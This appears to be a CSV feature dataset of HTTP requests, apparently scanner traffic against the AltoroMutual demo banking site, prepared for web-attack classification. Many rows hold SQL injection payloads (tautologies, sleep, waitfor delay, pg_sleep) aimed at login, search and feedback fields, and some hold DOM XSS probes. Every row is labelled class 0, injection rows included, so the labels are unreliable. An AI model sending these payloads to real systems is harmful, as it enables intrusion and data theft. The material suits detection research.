method,path,body,single_q,double_q,dashes,braces,spaces,badwords,class
GET,b'/my%20documents/JohnSmith/Bank%20Site%20Documents',b'',0,0,0,0,3,0,0
GET,b'/swagger/swagger-ui-bundle.js',b'',0,0,0,0,0,0,0
GET,b'/swagger/swagger-ui-standalone-preset.js',b'',0,0,0,0,0,0,0
POST,b'/doSubscribe',b'btnSubmit=Subscribe&txtEmail=sample%40email.tst',0,0,0,0,0,0,0
GET,b'/high_yield_investments.htm',b'',0,0,0,0,0,0,0
GET,b'/doSubscribe',b'',0,0,0,0,0,0,0
GET,b'/swagger/',b'',0,0,0,0,0,0,0
GET,b'/sitemap.xml',b'',0,0,0,0,0,0,0
GET,b'/images/',b'',0,0,0,0,0,0,0
GET,b'/sitemap.xml.gz',b'',0,0,0,0,0,0,0
GET,b'/survey_questions.jsp?step=a',b'',0,0,0,0,0,0,0
GET,b'/survey_questions.jsp?step=b',b'',0,0,0,0,0,0,0
GET,b'/security.htm',b'',0,0,0,0,0,0,0
GET,b'/',b'',0,0,0,0,0,0,0
GET,b'/urchin.js',b'',0,0,0,0,0,0,0
GET,"b""/swagger/index.html?wvstest=javascript:domxssExecutionSink(1,%22'%5C%22%3E%3Cxsstag%3E()locxss%22)""",b'',1,3,0,2,0,0,0
GET,b'/swagger/swagger-ui-standalone-preset.js',b'',0,0,0,0,0,0,0
GET,b'/swagger/swagger-ui-bundle.js',b'',0,0,0,0,0,0,0
GET,b'/util/serverStatusCheckService.jsp?HostName=AltoroMutual',b'',0,0,0,0,0,0,0
GET,"b""/login.jsp?wvstest=javascript:domxssExecutionSink(1,%22'%5C%22%3E%3Cxsstag%3E()locxss%22)""",b'',1,3,0,2,0,0,0
GET,"b""/status_check.jsp?wvstest=javascript:domxssExecutionSink(1,%22'%5C%22%3E%3Cxsstag%3E()locxss%22)""",b'',1,3,0,2,0,0,0
GET,"b""/index.jsp?wvstest=javascript:domxssExecutionSink(1,%22'%5C%22%3E%3Cxsstag%3E()locxss%22)&content=personal_investments.htm""",b'',1,3,0,2,0,0,0
GET,"b""/subscribe.jsp?wvstest=javascript:domxssExecutionSink(1,%22'%5C%22%3E%3Cxsstag%3E()locxss%22)""",b'',1,3,0,2,0,0,0
GET,b'/urchin.js',b'',0,0,0,0,0,0,0
GET,"b""/high_yield_investments.htm?wvstest=javascript:domxssExecutionSink(1,%22'%5C%22%3E%3Cxsstag%3E()locxss%22)""",b'',1,3,0,2,0,0,0
GET,b'/util/serverStatusCheckService.jsp?HostName=AltoroMutual',b'',0,0,0,0,0,0,0
GET,b'/util',b'',0,0,0,0,0,0,0
GET,b'/altoro',b'',0,0,0,0,0,0,0
GET,b'/altoro/images',b'',0,0,0,0,0,0,0
GET,b'/util/',b'',0,0,0,0,0,0,0
POST,b'/doLogin',b'btnSubmit=Login&passw=test2&uid=test2',0,0,0,0,0,1,0
POST,b'/doLogin',"b""btnSubmit=1'%22&passw=test2&uid=test2""",1,1,0,0,0,1,0
POST,b'/doLogin',b'btnSubmit=%5c&passw=test2&uid=test2',0,0,0,0,0,1,0
POST,b'/doLogin',b'btnSubmit=1%00%c0%a7%c0%a2&passw=test2&uid=test2',0,0,0,0,0,1,0
POST,b'/doLogin',b'btnSubmit=-1%20OR%202%2b250-250-1%3d0%2b0%2b0%2b1%20--%20&passw=test2&uid=test2',0,0,1,0,4,1,0
POST,b'/doLogin',b'btnSubmit=%40%4076BKJ&passw=test2&uid=test2',0,0,0,0,0,1,0
POST,b'/doLogin',b'btnSubmit=-1%20OR%202%2b365-365-1%3d0%2b0%2b0%2b1&passw=test2&uid=test2',0,0,0,0,2,1,0
POST,b'/doLogin',b'btnSubmit=JyI%3d&passw=test2&uid=test2',0,0,0,0,0,1,0
POST,b'/doLogin',"b""btnSubmit=-1'%20OR%202%2b952-952-1%3d0%2b0%2b0%2b1%20--%20&passw=test2&uid=test2""",1,0,1,0,4,1,0
POST,b'/sendFeedback',b'submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=hpjvaent&subject=1',0,0,0,0,0,0,0
GET,b'/swagger/index.html',b'',0,0,0,0,0,0,0
GET,b'/high_yield_investments.htm',b'',0,0,0,0,0,0,0
GET,b'/high_yield_investments.htm',b'',0,0,0,0,0,0,0
GET,b'/search.jsp?query=1',b'',0,0,0,0,0,0,0
POST,b'/sendFeedback',b'submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=ekpivksl&subject=1',0,0,0,0,0,0,0
POST,b'/doLogin',"b""btnSubmit=%bf'%bf%22&passw=test2&uid=test2""",1,1,0,0,0,1,0
GET,"b""/search.jsp?query=1'%22""",b'',1,1,0,0,0,0,0
GET,b'/swagger/index.html',b'',0,0,0,0,0,0,0
POST,b'/doLogin',"b""btnSubmit=-1'%20OR%202%2b81-81-1%3d0%2b0%2b0%2b1%20or%20'Nm7Fak3S'%3d'&passw=test2&uid=test2""",4,0,0,0,4,1,0
POST,b'/doLogin',"b""btnSubmit=%f0''%f0%22%22&passw=test2&uid=test2""",2,2,0,0,0,1,0
POST,b'/sendFeedback',"b""submit=Submit&cfile=1'%22&comments=1&email_addr=sample%40email.tst&name=ekpivksl&subject=1""",1,1,0,0,0,0,0
GET,"b""/1'%22.htm""",b'',1,1,0,0,0,0,0
POST,b'/doLogin',b'btnSubmit=-1%22%20OR%202%2b728-728-1%3d0%2b0%2b0%2b1%20--%20&passw=test2&uid=test2',0,1,1,0,4,1,0
GET,"b""/swagger/1'%22.html""",b'',1,1,0,0,0,0,0
GET,b'/search.jsp?query=%5c',b'',0,0,0,0,0,0,0
POST,b'/sendFeedback',b'submit=Submit&cfile=%5c&comments=1&email_addr=sample%40email.tst&name=ekpivksl&subject=1',0,0,0,0,0,0,0
POST,b'/doLogin',"b""btnSubmit=if(now()%3dsysdate()%2csleep(6)%2c0)/*'XOR(if(now()%3dsysdate()%2csleep(6)%2c0))OR'%22XOR(if(now()%3dsysdate()%2csleep(6)%2c0))OR%22*/&passw=test2&uid=test2""",2,2,0,14,0,4,0
GET,b'/swagger/aWSak2gA.html',b'',0,0,0,0,0,0,0
POST,b'/doLogin',b'btnSubmit=(select%20convert(int%2cCHAR(65)))&passw=test2&uid=test2',0,0,0,3,1,2,0
GET,b'/search.jsp?query=Iy2QRLGP',b'',0,0,0,0,0,0,0
POST,b'/sendFeedback',b'submit=Submit&cfile=40Ftm01Y&comments=1&email_addr=sample%40email.tst&name=hpjvaent&subject=1',0,0,0,0,0,0,0
GET,b'/%5c.htm',b'',0,0,0,0,0,0,0
GET,b'/8dxYLug4.htm',b'',0,0,0,0,0,0,0
GET,b'/search.jsp?query=1%00%c0%a7%c0%a2',b'',0,0,0,0,0,0,0
GET,b'/swagger/%5c.html',b'',0,0,0,0,0,0,0
POST,b'/sendFeedback',b'submit=Submit&cfile=1%00%c0%a7%c0%a2&comments=1&email_addr=sample%40email.tst&name=ekpivksl&subject=1',0,0,0,0,0,0,0
POST,b'/doLogin',"b""btnSubmit=(select(0)from(select(sleep(6)))v)/*'%2b(select(0)from(select(sleep(6)))v)%2b'%22%2b(select(0)from(select(sleep(6)))v)%2b%22*/&passw=test2&uid=test2""",2,2,0,15,0,10,0
POST,b'/doLogin',"b""btnSubmit=Login&passw=1'%22&uid=test2""",1,1,0,0,0,1,0
POST,b'/sendFeedback',b'submit=Submit&cfile=-1%20OR%202%2b743-743-1%3d0%2b0%2b0%2b1%20--%20&comments=1&email_addr=sample%40email.tst&name=hpjvaent&subject=1',0,0,1,0,4,0,0
GET,b'/1%00%c0%a7%c0%a2.htm',b'',0,0,0,0,0,0,0
GET,"b""/swagger/index'%20AND%202%2b1-1-1%3d0%2b0%2b0%2b1%20AND%20'ecOF'%3d'ecOF.html""",b'',4,0,0,0,4,0,0
GET,b'/search.jsp?query=-1%20OR%202%2b527-527-1%3d0%2b0%2b0%2b1%20--%20',b'',0,0,1,0,4,0,0
GET,"b""/high_yield_investments'%20AND%202%2b1-1-1%3d0%2b0%2b0%2b1%20AND%20'nSdx'%3d'nSdx.htm""",b'',4,0,0,0,4,0,0
GET,b'/search.jsp?query=%40%40AyKwW',b'',0,0,0,0,0,0,0
GET,b'/swagger/1%00%c0%a7%c0%a2.html',b'',0,0,0,0,0,0,0
POST,b'/sendFeedback',b'submit=Submit&cfile=%40%40hKDjP&comments=1&email_addr=sample%40email.tst&name=ekpivksl&subject=1',0,0,0,0,0,0,0
POST,b'/doLogin',b'btnSubmit=Login&passw=%5c&uid=test2',0,0,0,0,0,1,0
POST,b'/doLogin',"b""btnSubmit=1%20waitfor%20delay%20'0:0:6'%20--%20&passw=test2&uid=test2""",2,0,1,0,5,3,0
POST,b'/doLogin',b'btnSubmit=Login&passw=1%00%c0%a7%c0%a2&uid=test2',0,0,0,0,0,1,0
POST,b'/doLogin',"b""btnSubmit=aJuM5Q76';%20waitfor%20delay%20'0:0:6'%20--%20&passw=test2&uid=test2""",3,0,1,0,5,3,0
POST,b'/doLogin',b'btnSubmit=Login&passw=%40%40EJ8vK&uid=test2',0,0,0,0,0,1,0
POST,b'/doLogin',"b""btnSubmit=lryCOqWy');%20waitfor%20delay%20'0:0:6'%20--%20&passw=test2&uid=test2""",3,0,1,0,5,3,0
POST,b'/doLogin',b'btnSubmit=Login&passw=JyI%3d&uid=test2',0,0,0,0,0,1,0
POST,b'/doLogin',"b""btnSubmit=K3mYpf5o'));%20waitfor%20delay%20'0:0:9'%20--%20&passw=test2&uid=test2""",3,0,1,0,5,3,0
POST,b'/doLogin',"b""btnSubmit=mkD5oSD6';select%20pg_sleep(9);%20--%20&passw=test2&uid=test2""",1,0,1,1,3,3,0
POST,b'/doLogin',"b""btnSubmit=Login&passw=%bf'%bf%22&uid=test2""",1,1,0,0,0,1,0
POST,b'/sendFeedback',b'submit=Submit&cfile=JyI%3d&comments=1&email_addr=sample%40email.tst&name=ekpivksl&subject=1',0,0,0,0,0,0,0
POST,b'/sendFeedback',b'submit=Submit&cfile=-1%20OR%202%2b725-725-1%3d0%2b0%2b0%2b1&comments=1&email_addr=sample%40email.tst&name=hpjvaent&subject=1',0,0,0,0,2,0,0
GET,b'/high_yield_investments%22%20AND%202%2b1-1-1%3d0%2b0%2b0%2b1%20AND%20%22b43b%22%3d%22b43b.htm',b'',0,4,0,0,4,0,0
GET,b'/search.jsp?query=JyI%3d',b'',0,0,0,0,0,0,0
GET,b'/swagger/%40%40GGuOd.html',b'',0,0,0,0,0,0,0
GET,b'/swagger/index%22%20AND%202%2b1-1-1%3d0%2b0%2b0%2b1%20AND%20%226F11%22%3d%226F11.html',b'',0,4,0,0,4,0,0
GET,b'/search.jsp?query=-1%20OR%203%2b527-527-1%3d0%2b0%2b0%2b1%20--%20',b'',0,0,1,0,4,0,0
POST,b'/doLogin',"b""btnSubmit=Login&passw=%f0''%f0%22%22&uid=test2""",2,2,0,0,0,1,0
POST,b'/doLogin',"b""btnSubmit=WQhT16bc');select%20pg_sleep(9);%20--%20&passw=test2&uid=test2""",1,0,1,1,3,3,0
GET,b'/%40%4006zcV.htm',b'',0,0,0,0,0,0,0
POST,b'/sendFeedback',"b""submit=Submit&cfile=-1'%20OR%202%2b185-185-1%3d0%2b0%2b0%2b1%20--%20&comments=1&email_addr=sample%40email.tst&name=hpjvaent&subject=1""",1,0,1,0,4,0,0
GET,"b""/search.jsp?query=%bf'%bf%22""",b'',1,1,0,0,0,0,0
GET,b'/JyI%3d.htm',b'',0,0,0,0,0,0,0
POST,b'/doLogin',b'btnSubmit=Login&passw=(select%20convert(int%2cCHAR(65)))&uid=test2',0,0,0,3,1,2,0
POST,b'/doLogin',"b""btnSubmit=qT5ZnFXz'));select%20pg_sleep(9);%20--%20&passw=test2&uid=test2""",1,0,1,1,3,3,0
GET,b'/swagger/JyI%3d.html',b'',0,0,0,0,0,0,0
GET,"b""/swagger/index%25'%20AND%202%2b1-1-1%3d0%2b0%2b0%2b1%20AND%20'YXRK'%21%3d'YXRK%25.html""",b'',4,0,0,0,4,0,0
GET,b'/search.jsp?query=-1%20OR%203*2<(0%2b5%2b527-527)%20--%20',b'',0,0,1,1,4,0,0
POST,b'/sendFeedback',"b""submit=Submit&cfile=%bf'%bf%22&comments=1&email_addr=sample%40email.tst&name=ekpivksl&subject=1""",1,1,0,0,0,0,0
GET,"b""/high_yield_investments%25'%20AND%202%2b1-1-1%3d0%2b0%2b0%2b1%20AND%20'mkKJ'%21%3d'mkKJ%25.htm""",b'',4,0,0,0,4,0,0
POST,b'/sendFeedback',"b""submit=Submit&cfile=-1'%20OR%202%2b66-66-1%3d0%2b0%2b0%2b1%20or%20'GlphG71B'%3d'&comments=1&email_addr=sample%40email.tst&name=hpjvaent&subject=1""",4,0,0,0,4,0,0
GET,"b""/search.jsp?query=%f0''%f0%22%22""",b'',2,2,0,0,0,0,0
GET,b'/search.jsp?query=-1%20OR%203*2>(0%2b5%2b527-527)%20--%20',b'',0,0,1,1,4,0,0
GET,"b""/swagger/if(now()%3dsysdate()%2csleep(9)%2c0)/*'XOR(if(now()%3dsysdate()%2csleep(9)%2c0))OR'%22XOR(if(now()%3dsysdate()%2csleep(9)%2c0))OR%22*/.html""",b'',2,2,0,14,0,3,0
GET,"b""/%bf'%bf%22.htm""",b'',1,1,0,0,0,0,0
GET,"b""/swagger/%bf'%bf%22.html""",b'',1,1,0,0,0,0,0
POST,b'/doLogin',"b""btnSubmit=Login&passw=test2&uid=1'%22""",1,1,0,0,0,1,0
POST,b'/sendFeedback',"b""submit=Submit&cfile=%f0''%f0%22%22&comments=1&email_addr=sample%40email.tst&name=ekpivksl&subject=1""",2,2,0,0,0,0,0
GET,"b""/if(now()%3dsysdate()%2csleep(9)%2c0)/*'XOR(if(now()%3dsysdate()%2csleep(9)%2c0))OR'%22XOR(if(now()%3dsysdate()%2csleep(9)%2c0))OR%22*/.htm""",b'',2,2,0,14,0,3,0
POST,b'/sendFeedback',b'submit=Submit&cfile=-1%22%20OR%202%2b168-168-1%3d0%2b0%2b0%2b1%20--%20&comments=1&email_addr=sample%40email.tst&name=hpjvaent&subject=1',0,1,1,0,4,0,0
GET,b'/search.jsp?query=-1%20OR%202%2b335-335-1%3d0%2b0%2b0%2b1',b'',0,0,0,0,2,0,0
POST,b'/doLogin',b'btnSubmit=Login&passw=test2&uid=%5c',0,0,0,0,0,1,0
POST,b'/sendFeedback',b'submit=Submit&cfile=(select%20convert(int%2cCHAR(65)))&comments=1&email_addr=sample%40email.tst&name=ekpivksl&subject=1',0,0,0,3,1,1,0
GET,"b""/(select(0)from(select(sleep(3)))v)/*'%2b(select(0)from(select(sleep(3)))v)%2b'%22%2b(select(0)from(select(sleep(3)))v)%2b%22*/.htm""",b'',2,2,0,15,0,9,0
GET,"b""/%f0''%f0%22%22.htm""",b'',2,2,0,0,0,0,0
GET,"b""/swagger/%f0''%f0%22%22.html""",b'',2,2,0,0,0,0,0
GET,b'/search.jsp?query=(select%20convert(int%2cCHAR(65)))',b'',0,0,0,3,1,1,0
GET,"b""/swagger/(select(0)from(select(sleep(3)))v)/*'%2b(select(0)from(select(sleep(3)))v)%2b'%22%2b(select(0)from(select(sleep(3)))v)%2b%22*/.html""",b'',2,2,0,15,0,9,0
POST,b'/doLogin',b'btnSubmit=Login&passw=-1%20OR%202%2b253-253-1%3d0%2b0%2b0%2b1%20--%20&uid=test2',0,0,1,0,4,1,0
POST,b'/doLogin',b'btnSubmit=Login&passw=test2&uid=1%00%c0%a7%c0%a2',0,0,0,0,0,1,0
POST,b'/doLogin',b'btnSubmit=Login&passw=test2&uid=%40%40mNC8X',0,0,0,0,0,1,0
POST,b'/doLogin',b'btnSubmit=Login&passw=-1%20OR%202%2b111-111-1%3d0%2b0%2b0%2b1&uid=test2',0,0,0,0,2,1,0
POST,b'/doLogin',b'btnSubmit=Login&passw=test2&uid=JyI%3d',0,0,0,0,0,1,0
POST,b'/doLogin',"b""btnSubmit=Login&passw=-1'%20OR%202%2b678-678-1%3d0%2b0%2b0%2b1%20--%20&uid=test2""",1,0,1,0,4,1,0
POST,b'/doLogin',"b""btnSubmit=Login&passw=-1'%20OR%202%2b233-233-1%3d0%2b0%2b0%2b1%20or%20'HNVQHfgn'%3d'&uid=test2""",4,0,0,0,4,1,0
POST,b'/doLogin',"b""btnSubmit=Login&passw=test2&uid=%bf'%bf%22""",1,1,0,0,0,1,0
POST,b'/doLogin',"b""btnSubmit=Login&passw=-1'%20OR%203%2b233-233-1%3d0%2b0%2b0%2b1%20or%20'HNVQHfgn'%3d'&uid=test2""",4,0,0,0,4,1,0
POST,b'/doLogin',"b""btnSubmit=Login&passw=test2&uid=%f0''%f0%22%22""",2,2,0,0,0,1,0
POST,b'/doLogin',"b""btnSubmit=Login&passw=-1'%20OR%203*2<(0%2b5%2b233-233)%20or%20'HNVQHfgn'%3d'&uid=test2""",4,0,0,1,4,1,0
POST,b'/doLogin',b'btnSubmit=Login&passw=test2&uid=(select%20convert(int%2cCHAR(65)))',0,0,0,3,1,2,0
POST,b'/sendFeedback',"b""submit=Submit&cfile=if(now()%3dsysdate()%2csleep(3)%2c0)/*'XOR(if(now()%3dsysdate()%2csleep(3)%2c0))OR'%22XOR(if(now()%3dsysdate()%2csleep(3)%2c0))OR%22*/&comments=1&email_addr=sample%40email.tst&name=hpjvaent&subject=1""",2,2,0,14,0,3,0
GET,b'/(select%20convert(int%2cCHAR(65))).htm',b'',0,0,0,3,1,1,0
GET,"b""/1%20waitfor%20delay%20'0:0:3'%20--%20.htm""",b'',2,0,1,0,5,2,0
GET,"b""/swagger/1%20waitfor%20delay%20'0:0:3'%20--%20.html""",b'',2,0,1,0,5,2,0
GET,b'/swagger/(select%20convert(int%2cCHAR(65))).html',b'',0,0,0,3,1,1,0
GET,b'/util/serverStatusCheckService.jsp?HostName=AltoroMutual&HostName=AltoroMutual',b'',0,0,0,0,0,0,0
GET,"b""/search.jsp?query=-1'%20OR%202%2b726-726-1%3d0%2b0%2b0%2b1%20--%20""",b'',1,0,1,0,4,0,0
POST,b'/doLogin',"b""btnSubmit=Login&passw=-1'%20OR%203*2>(0%2b5%2b233-233)%20or%20'HNVQHfgn'%3d'&uid=test2""",4,0,0,1,4,1,0
POST,b'/sendFeedback',"b""submit=Submit&cfile=(select(0)from(select(sleep(3)))v)/*'%2b(select(0)from(select(sleep(3)))v)%2b'%22%2b(select(0)from(select(sleep(3)))v)%2b%22*/&comments=1&email_addr=sample%40email.tst&name=hpjvaent&subject=1""",2,2,0,15,0,9,0
GET,"b""/util/serverStatusCheckService.jsp?HostName=AltoroMutual&HostName=1'%22""",b'',1,1,0,0,0,0,0
POST,b'/sendFeedback',"b""submit=Submit&cfile=comments.txt&comments=1'%22&email_addr=sample%40email.tst&name=ekpivksl&subject=1""",1,1,0,0,0,0,0
GET,"b""/swagger/BoJPi8GV';%20waitfor%20delay%20'0:0:6'%20--%20.html""",b'',3,0,1,0,5,2,0
GET,"b""/search.jsp?query=-1'%20OR%203%2b726-726-1%3d0%2b0%2b0%2b1%20--%20""",b'',1,0,1,0,4,0,0
GET,b'/',b'',0,0,0,0,0,0,0
GET,"b""/HSq9dOU3';%20waitfor%20delay%20'0:0:6'%20--%20.htm""",b'',3,0,1,0,5,2,0
GET,b'/',b'',0,0,0,0,0,0,0
POST,b'/doLogin',"b""btnSubmit=Login&passw=-1'%20OR%202%2b1-1-1%3d1%20AND%20233%3d233%20or%20'HNVQHfgn'%3d'&uid=test2""",4,0,0,0,6,1,0
POST,b'/sendFeedback',"b""submit=Submit&cfile=1%20waitfor%20delay%20'0:0:6'%20--%20&comments=1&email_addr=sample%40email.tst&name=hpjvaent&subject=1""",2,0,1,0,5,2,0
GET,b'/util/serverStatusCheckService.jsp?HostName=AltoroMutual&HostName=%5c',b'',0,0,0,0,0,0,0
GET,"b""/Pqh32OFS');%20waitfor%20delay%20'0:0:6'%20--%20.htm""",b'',3,0,1,0,5,2,0
GET,"b""/swagger/qZj5FZCR');%20waitfor%20delay%20'0:0:6'%20--%20.html""",b'',3,0,1,0,5,2,0
POST,b'/sendFeedback',b'submit=Submit&cfile=comments.txt&comments=%5c&email_addr=sample%40email.tst&name=ekpivksl&subject=1',0,0,0,0,0,0,0
GET,"b""/search.jsp?query=-1'%20OR%203*2<(0%2b5%2b726-726)%20--%20""",b'',1,0,1,1,4,0,0
GET,b'/util/serverStatusCheckService.jsp?HostName=AltoroMutual&HostName=LoLuJZg6',b'',0,0,0,0,0,0,0
POST,b'/doLogin',"b""btnSubmit=Login&passw=-1'%20OR%20233%3d233%20AND%203%2b1-1-1%3d1%20or%20'HNVQHfgn'%3d'&uid=test2""",4,0,0,0,6,1,0
GET,b'/',b'',0,0,0,0,0,0,0
POST,b'/sendFeedback',"b""submit=Submit&cfile=cZgYHKcy';%20waitfor%20delay%20'0:0:6'%20--%20&comments=1&email_addr=sample%40email.tst&name=hpjvaent&subject=1""",3,0,1,0,5,2,0
GET,b'/util/serverStatusCheckService.jsp?HostName=AltoroMutual&HostName=1%00%c0%a7%c0%a2',b'',0,0,0,0,0,0,0
GET,"b""/xYyKwydM'));%20waitfor%20delay%20'0:0:9'%20--%20.htm""",b'',3,0,1,0,5,2,0
GET,"b""/search.jsp?query=-1'%20OR%203*2>(0%2b5%2b726-726)%20--%20""",b'',1,0,1,1,4,0,0
POST,b'/sendFeedback',b'submit=Submit&cfile=comments.txt&comments=1%00%c0%a7%c0%a2&email_addr=sample%40email.tst&name=ekpivksl&subject=1',0,0,0,0,0,0,0
GET,b'/util/serverStatusCheckService.jsp?HostName=AltoroMutual&HostName=-1%20OR%202%2b618-618-1%3d0%2b0%2b0%2b1%20--%20',b'',0,0,1,0,4,0,0
GET,"b""/swagger/8Lu1hHOV'));%20waitfor%20delay%20'0:0:9'%20--%20.html""",b'',3,0,1,0,5,2,0
GET,b'/',b'',0,0,0,0,0,0,0
POST,b'/doLogin',"b""btnSubmit=Login&passw=-1'%20OR%203*2%3d5%20AND%20233%3d233%20or%20'HNVQHfgn'%3d'&uid=test2""",4,0,0,0,6,1,0
GET,b'/',b'',0,0,0,0,0,0,0
POST,b'/sendFeedback',"b""submit=Submit&cfile=ZqukQOAI');%20waitfor%20delay%20'0:0:9'%20--%20&comments=1&email_addr=sample%40email.tst&name=hpjvaent&subject=1""",3,0,1,0,5,2,0
GET,b'/util/serverStatusCheckService.jsp?HostName=AltoroMutual&HostName=%40%40LPYa9',b'',0,0,0,0,0,0,0
GET,"b""/RbV8oxBw';select%20pg_sleep(9);%20--%20.htm""",b'',1,0,1,1,3,2,0
GET,"b""/search.jsp?query=-1'%20OR%202%2b156-156-1%3d0%2b0%2b0%2b1%20or%20'F99djIW9'%3d'""",b'',4,0,0,0,4,0,0
POST,b'/doLogin',"b""btnSubmit=Login&passw=-1'%20OR%203*2%3d6%20AND%20233%3d233%20or%20'HNVQHfgn'%3d'&uid=test2""",4,0,0,0,6,1,0
POST,b'/doLogin',"b""btnSubmit=Login&passw=-1'%20OR%203*2*0%3d6%20AND%20233%3d233%20or%20'HNVQHfgn'%3d'&uid=test2""",4,0,0,0,6,1,0
POST,b'/doLogin',"b""btnSubmit=Login&passw=-1'%20OR%203*2*1%3d6%20AND%20233%3d233%20or%20'HNVQHfgn'%3d'&uid=test2""",4,0,0,0,6,1,0
